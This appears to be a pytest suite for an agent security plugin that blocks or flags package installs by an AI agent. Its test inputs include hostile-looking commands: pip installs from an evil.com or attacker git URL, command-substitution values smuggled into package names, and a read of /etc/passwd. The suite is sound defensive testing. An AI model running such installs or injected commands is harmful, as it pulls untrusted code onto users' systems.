"""Integration tests for the Hermes Agent plugin.

These tests exercise the full plugin → scanner → response-engine pipeline
using mocked enrichment calls (no real network access).
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from agentshield.core.config import Config
from agentshield.core.models import (
    Decision,
    DecisionAction,
    Ecosystem,
    Finding,
    ScanRequest,
    ScanResult,
    Severity,
)
from agentshield.integrations.hermes._types import ToolCall, ToolResult
from agentshield.integrations.hermes.plugin import (
    AgentShieldPlugin,
    _find_shell_suspicions,
    _parse_shell_packages,
    _tokenize_packages,
)


def _make_plugin(tmp_path: Path, extra_config: dict | None = None) -> AgentShieldPlugin:
    base: dict = {"cache": {"db_path": str(tmp_path / "test.db")}}
    if extra_config:
        base.update(extra_config)
    config = Config.model_validate(base)
    return AgentShieldPlugin(config=config)


def _clean_result(request: ScanRequest) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[],
        max_severity=Severity.NONE,
        decision=Decision(action=DecisionAction.ALLOW, reason="No issues found"),
    )


def _block_result(request: ScanRequest, finding: Finding) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[finding],
        max_severity=Severity.CRITICAL,
        decision=Decision(
            action=DecisionAction.BLOCK,
            reason=f"BLOCK due to {finding.rule_id}",
            findings=[finding],
        ),
    )


def _warn_result(request: ScanRequest, finding: Finding) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[finding],
        max_severity=Severity.HIGH,
        decision=Decision(
            action=DecisionAction.NEEDS_CONFIRMATION,
            reason=f"NEEDS_CONFIRMATION due to {finding.rule_id}",
            findings=[finding],
        ),
    )


# ── Pass-through (ALLOW) ──────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_clean_package_passes_through(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="pip_install", args={"package": "requests"})
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")

    with patch.object(plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))):
        result = await plugin.before_tool_call(call)

    # Must return the original ToolCall unmodified (ALLOW → pass through)
    assert result is call


@pytest.mark.asyncio
async def test_non_intercepted_tool_passes_through(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="read_file", args={"path": "/etc/passwd"})

    # Shield should never be called for non-install tools
    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert result is call
    mock_scan.assert_not_called()


# ── BLOCK decision ────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_blocked_package_returns_tool_error(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="pip_install", args={"package": "evil-pkg"})
    req = ScanRequest(package="evil-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
    finding = Finding(
        rule_id="T1.1",
        title="Known malicious package",
        severity=Severity.CRITICAL,
        source="malicious_db",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    assert "blocked" in (result.error_message or "").lower()
    assert "pip_install" in (result.error_message or "") or "evil-pkg" in (
        result.error_message or ""
    )


@pytest.mark.asyncio
async def test_blocked_npm_package(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="npm_install", args={"package": "evil-npm"})
    req = ScanRequest(package="evil-npm", ecosystem=Ecosystem.NPM, source="hermes")
    finding = Finding(
        rule_id="T1.1",
        title="Malicious npm package",
        severity=Severity.CRITICAL,
        source="malicious_db",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


@pytest.mark.asyncio
async def test_blocked_cargo_package(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="cargo_add", args={"package": "evil-crate"})
    req = ScanRequest(package="evil-crate", ecosystem=Ecosystem.CARGO, source="hermes")
    finding = Finding(
        rule_id="T1.1",
        title="Malicious crate",
        severity=Severity.CRITICAL,
        source="malicious_db",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


# ── NEEDS_CONFIRMATION decision ───────────────────────────────────────────────


@pytest.mark.asyncio
async def test_warn_package_returns_confirmation_request(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="pip_install", args={"package": "suspicious-pkg"})
    req = ScanRequest(package="suspicious-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
    finding = Finding(
        rule_id="CVE-2024-9999",
        title="High severity CVE",
        severity=Severity.HIGH,
        source="osv",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.requires_confirmation
    assert result.on_confirm is call
    assert "CVE-2024-9999" in result.confirmation_message or "issue" in result.confirmation_message


# ── ScanRequest construction ──────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_scan_request_uses_package_from_args(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="pip_install",
        args={"package": "numpy", "version": "1.24.0"},
    )

    captured: list[ScanRequest] = []

    async def _mock_scan(r: ScanRequest) -> ScanResult:
        captured.append(r)
        return _clean_result(r)

    with patch.object(plugin.shield, "ascan", new=_mock_scan):
        await plugin.before_tool_call(call)

    assert captured[0].package == "numpy"
    assert captured[0].version == "1.24.0"
    assert captured[0].ecosystem == Ecosystem.PYPI
    assert captured[0].source == "hermes"


@pytest.mark.asyncio
async def test_context_hint_forwarded(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="pip_install",
        args={"package": "flask", "reason": "Building a web API"},
    )

    captured: list[ScanRequest] = []

    async def _mock_scan(r: ScanRequest) -> ScanResult:
        captured.append(r)
        return _clean_result(r)

    with patch.object(plugin.shield, "ascan", new=_mock_scan):
        await plugin.before_tool_call(call)

    assert captured[0].context_hint == "Building a web API"


# ── Denylist short-circuit (real scanner, no network) ─────────────────────────


@pytest.mark.asyncio
async def test_denylist_blocks_via_plugin(tmp_path):
    plugin = _make_plugin(tmp_path, {"denylist": ["colouredlogs"]})
    call = ToolCall(name="pip_install", args={"package": "colouredlogs"})

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    assert (
        "colouredlogs" in (result.error_message or "").lower()
        or "blocked" in (result.error_message or "").lower()
    )


# ── _parse_shell_packages unit tests ─────────────────────────────────────────


def test_parse_pip_install_basic():
    pkgs = _parse_shell_packages("pip install requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip3_install():
    pkgs = _parse_shell_packages("pip3 install flask")
    assert pkgs == [("flask", Ecosystem.PYPI)]


def test_parse_python_m_pip():
    pkgs = _parse_shell_packages("python -m pip install numpy")
    assert pkgs == [("numpy", Ecosystem.PYPI)]


def test_parse_uv_pip_install():
    pkgs = _parse_shell_packages("uv pip install httpx")
    assert pkgs == [("httpx", Ecosystem.PYPI)]


def test_parse_pip_install_with_break_system_packages():
    pkgs = _parse_shell_packages("pip install --break-system-packages requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_version_specifier():
    pkgs = _parse_shell_packages("pip install requests==2.28.0")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_extras():
    pkgs = _parse_shell_packages("pip install requests[security]>=2.28.0")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_multiple_packages():
    pkgs = _parse_shell_packages("pip install requests numpy pandas==1.5.0")
    assert pkgs == [
        ("requests", Ecosystem.PYPI),
        ("numpy", Ecosystem.PYPI),
        ("pandas", Ecosystem.PYPI),
    ]


def test_parse_pip_install_with_upgrade_flag():
    pkgs = _parse_shell_packages("pip install -U requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_with_user_flag():
    pkgs = _parse_shell_packages("pip install --user requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_skips_requirements_file():
    # -r takes the next token as a value, so req.txt should be skipped
    pkgs = _parse_shell_packages("pip install -r requirements.txt requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_pip_install_index_url():
    pkgs = _parse_shell_packages("pip install --index-url https://pypi.org/simple requests")
    assert pkgs == [("requests", Ecosystem.PYPI)]


def test_parse_npm_install():
    pkgs = _parse_shell_packages("npm install express")
    assert pkgs == [("express", Ecosystem.NPM)]


def test_parse_npm_i_shorthand():
    pkgs = _parse_shell_packages("npm i lodash")
    assert pkgs == [("lodash", Ecosystem.NPM)]


def test_parse_yarn_add():
    pkgs = _parse_shell_packages("yarn add react react-dom")
    assert pkgs == [("react", Ecosystem.NPM), ("react-dom", Ecosystem.NPM)]


def test_parse_cargo_add():
    pkgs = _parse_shell_packages("cargo add serde")
    assert pkgs == [("serde", Ecosystem.CARGO)]


def test_parse_cargo_install():
    pkgs = _parse_shell_packages("cargo install ripgrep")
    assert pkgs == [("ripgrep", Ecosystem.CARGO)]


def test_parse_chained_commands():
    cmd = "pip install requests && npm install express"
    pkgs = _parse_shell_packages(cmd)
    assert ("requests", Ecosystem.PYPI) in pkgs
    assert ("express", Ecosystem.NPM) in pkgs


def test_parse_no_install_command():
    pkgs = _parse_shell_packages("ls -la /tmp")
    assert pkgs == []


def test_parse_empty_command():
    assert _parse_shell_packages("") == []


def test_tokenize_packages_strips_flags():
    pkgs = _tokenize_packages("--break-system-packages --user requests numpy")
    assert pkgs == ["requests", "numpy"]


def test_tokenize_packages_skips_paths():
    pkgs = _tokenize_packages("/usr/local requests")
    assert pkgs == ["requests"]


def test_tokenize_packages_skips_urls():
    pkgs = _tokenize_packages("https://example.com/pkg requests")
    assert pkgs == ["requests"]


# ── Shell tool interception (plugin-level) ────────────────────────────────────


@pytest.mark.asyncio
async def test_bash_tool_no_install_passes_through(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "ls -la /tmp"})

    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert result is call
    mock_scan.assert_not_called()


@pytest.mark.asyncio
async def test_bash_tool_pip_install_clean_passes_through(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="bash",
        args={"command": "pip install --break-system-packages requests"},
    )
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")

    with patch.object(plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))):
        result = await plugin.before_tool_call(call)

    assert result is call


@pytest.mark.asyncio
async def test_bash_tool_pip_install_blocked(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="bash",
        args={"command": "pip install --break-system-packages evil-pkg"},
    )
    req = ScanRequest(package="evil-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
    finding = Finding(
        rule_id="T1.1",
        title="Known malicious package",
        severity=Severity.CRITICAL,
        source="malicious_db",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    assert "evil-pkg" in (result.error_message or "")
    assert "blocked" in (result.error_message or "").lower()


@pytest.mark.asyncio
async def test_bash_tool_pip_install_needs_confirmation(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="bash",
        args={"command": "pip install suspicious-pkg"},
    )
    req = ScanRequest(package="suspicious-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
    finding = Finding(
        rule_id="CVE-2024-9999",
        title="High severity CVE",
        severity=Severity.HIGH,
        source="osv",
    )

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))
    ):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.requires_confirmation
    assert result.on_confirm is call


@pytest.mark.asyncio
@pytest.mark.parametrize("tool_name", ["bash", "shell", "run_command", "execute", "terminal"])
async def test_all_shell_tool_names_intercepted(tmp_path, tool_name):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name=tool_name, args={"command": "pip install requests"})
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
    ) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert result is call
    mock_scan.assert_called_once()


@pytest.mark.asyncio
async def test_shell_cmd_key_alias(tmp_path):
    """Tool args key 'cmd' (instead of 'command') should also be recognised."""
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"cmd": "pip install requests"})
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
    ) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert result is call
    mock_scan.assert_called_once()


@pytest.mark.asyncio
async def test_shell_code_key_alias(tmp_path):
    """Tool args key 'code' should also be recognised."""
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"code": "pip install requests"})
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")

    with patch.object(
        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
    ) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert result is call
    mock_scan.assert_called_once()


@pytest.mark.asyncio
async def test_bash_tool_multiple_packages_first_block_wins(tmp_path):
    """When multiple packages are found, a BLOCK on any one blocks the whole command."""
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="bash",
        args={"command": "pip install requests evil-pkg numpy"},
    )
    finding = Finding(
        rule_id="T1.1",
        title="Known malicious",
        severity=Severity.CRITICAL,
        source="malicious_db",
    )

    async def _side_effect(request: ScanRequest) -> ScanResult:
        if request.package == "evil-pkg":
            return _block_result(request, finding)
        return _clean_result(request)

    with patch.object(plugin.shield, "ascan", new=_side_effect):
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    assert "evil-pkg" in (result.error_message or "")


@pytest.mark.asyncio
async def test_bash_tool_npm_install(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "npm install express"})

    captured: list[ScanRequest] = []

    async def _capture(r: ScanRequest) -> ScanResult:
        captured.append(r)
        return _clean_result(r)

    with patch.object(plugin.shield, "ascan", new=_capture):
        await plugin.before_tool_call(call)

    assert captured[0].package == "express"
    assert captured[0].ecosystem == Ecosystem.NPM


@pytest.mark.asyncio
async def test_bash_tool_cargo_add(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "cargo add serde"})

    captured: list[ScanRequest] = []

    async def _capture(r: ScanRequest) -> ScanResult:
        captured.append(r)
        return _clean_result(r)

    with patch.object(plugin.shield, "ascan", new=_capture):
        await plugin.before_tool_call(call)

    assert captured[0].package == "serde"
    assert captured[0].ecosystem == Ecosystem.CARGO


@pytest.mark.asyncio
async def test_bash_tool_denylist_blocks(tmp_path):
    """Real scanner (no mock) — denylist entry blocks the bash command."""
    plugin = _make_plugin(tmp_path, {"denylist": ["colouredlogs"]})
    call = ToolCall(
        name="bash",
        args={"command": "pip install --break-system-packages colouredlogs"},
    )

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    assert (
        "colouredlogs" in (result.error_message or "").lower()
        or "blocked" in (result.error_message or "").lower()
    )


# ── Shell suspicion detection (_find_shell_suspicions) ───────────────────────


def test_find_suspicions_dollar_var():
    s = _find_shell_suspicions("pip install $PKG")
    assert len(s) == 1
    assert "$PKG" in s[0]


def test_find_suspicions_braced_var():
    s = _find_shell_suspicions("pip install ${EVIL_PKG}")
    assert len(s) == 1
    assert "${EVIL_PKG}" in s[0]


def test_find_suspicions_command_sub():
    s = _find_shell_suspicions("pip install $(get_pkg)")
    assert len(s) == 1
    assert "$(get_pkg)" in s[0]


def test_find_suspicions_git_plus_https():
    s = _find_shell_suspicions("pip install git+https://evil.com/pkg.git")
    assert len(s) == 1
    assert "git+https://" in s[0]


def test_find_suspicions_git_plus_ssh():
    s = _find_shell_suspicions("pip install git+ssh://github.com/user/repo.git")
    assert len(s) == 1
    assert "git+ssh://" in s[0]


def test_find_suspicions_clean_package_no_suspicions():
    assert _find_shell_suspicions("pip install requests") == []


def test_find_suspicions_non_install_command():
    assert _find_shell_suspicions("echo $HOME") == []


def test_find_suspicions_multiple_patterns():
    s = _find_shell_suspicions("pip install $PKG git+https://evil.com/pkg.git")
    assert len(s) == 2


# ── Plugin blocks on suspicious shell patterns ───────────────────────────────


@pytest.mark.asyncio
async def test_bash_tool_env_var_in_package_blocked(tmp_path):
    """pip install $PKG must be blocked — the package name cannot be verified."""
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "pip install $EVIL_PKG"})

    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
        result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error
    mock_scan.assert_not_called()  # scanner must not be called for unanalyzable args


@pytest.mark.asyncio
async def test_bash_tool_braced_env_var_blocked(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "pip install ${EVIL}"})

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


@pytest.mark.asyncio
async def test_bash_tool_command_sub_blocked(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "pip install $(evil-cmd)"})

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


@pytest.mark.asyncio
async def test_bash_tool_git_plus_https_blocked(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(name="bash", args={"command": "pip install git+https://evil.com/pkg.git"})

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


@pytest.mark.asyncio
async def test_bash_tool_git_plus_ssh_blocked(tmp_path):
    plugin = _make_plugin(tmp_path)
    call = ToolCall(
        name="bash",
        args={"command": "pip install git+ssh://github.com/attacker/pkg.git"},
    )

    result = await plugin.before_tool_call(call)

    assert isinstance(result, ToolResult)
    assert result.is_error


def test_tokenize_packages_skips_git_url():
    """git+ URLs must be silently skipped, not treated as package names."""
    pkgs = _tokenize_packages("git+https://evil.com/pkg.git requests")
    assert pkgs == ["requests"]
    assert not any("git+" in p for p in pkgs)
